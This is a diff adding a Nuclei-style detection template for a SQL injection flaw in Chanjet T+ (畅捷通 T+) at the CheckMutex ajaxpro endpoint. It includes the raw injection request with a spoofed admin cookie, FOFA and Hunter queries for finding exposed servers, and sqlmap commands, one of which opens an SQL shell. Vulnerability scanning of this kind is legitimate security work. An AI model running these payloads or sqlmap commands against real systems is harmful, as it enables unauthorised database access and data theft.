@@ -1,0 +1,44 @@
+id: changjet-tplus-CheckMutex-SQL
+info:
+  name: 畅捷通 T+ CheckMutex - sqli
+  author: leadlife
+  severity: high
+  description: 畅捷通 /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx 存在sql注入漏洞
+  reference:
+     - todo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+    hunter-query: app.name="畅捷通 T+"
+    sqlmap: |
+      sql sqlmap.py -r sql.txt --random-agent -v 3 --dbms mssql --hex -p "accNum" --batch
+      getshell sqlmap.py -r sql.txt --random-agent -v 3 --dbms mssql --hex -p "accNum" --batch --sql-shell
+  tags: changjet,sqli,tplus
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+        Cookie: ASP.NET_SessionId=; sid=admin
+
+        {"accNum": "6'", "functionTag": "SYS0104", "url": ""}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'order by begintime'
+          - '"value":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+
+      - type: status
+        status:
+          - 200
